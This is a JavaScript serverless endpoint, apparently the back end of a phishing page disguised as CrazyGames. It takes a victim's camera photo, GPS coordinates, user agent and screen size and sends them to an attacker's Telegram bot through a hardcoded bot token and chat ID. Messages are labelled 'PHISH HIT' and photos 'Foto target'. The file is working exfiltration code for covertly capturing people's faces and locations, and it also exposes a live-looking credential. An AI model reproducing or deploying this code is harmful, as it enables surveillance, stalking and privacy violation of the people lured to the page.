export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const BOT_TOKEN = '8901654512:AAHiYu0ijRGTsZouWHbgicFrFZf48FC8tn4';
const CHAT_ID  = '6701550065';

  const { photo, lat, lon, ua, screen } = req.body || {};
  const waktu = new Date().toLocaleString('id-ID');

  const pesan = `🎮 *CRAZYGAMES PHISH HIT*\n` +
                `⏰ ${waktu}\n` +
                `📍 Lat: \`${lat || 'ditolak'}\`\n` +
                `📍 Lon: \`${lon || 'ditolak'}\`\n` +
                `📱 Screen: ${screen || '-'}\n` +
                `🔍 UA: ${(ua || '-').slice(0, 100)}`;

  try {
    // kirim teks
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: pesan,
        parse_mode: 'Markdown'
      })
    });

    // kirim foto kalau ada
    if (photo && photo.startsWith('data:image')) {
      const base64 = photo.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(base64, 'base64');

      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('caption', `📷 Foto target\n📍 ${lat}, ${lon}`);
      form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'face.jpg');

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
      });
    }

    res.status(200).json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
}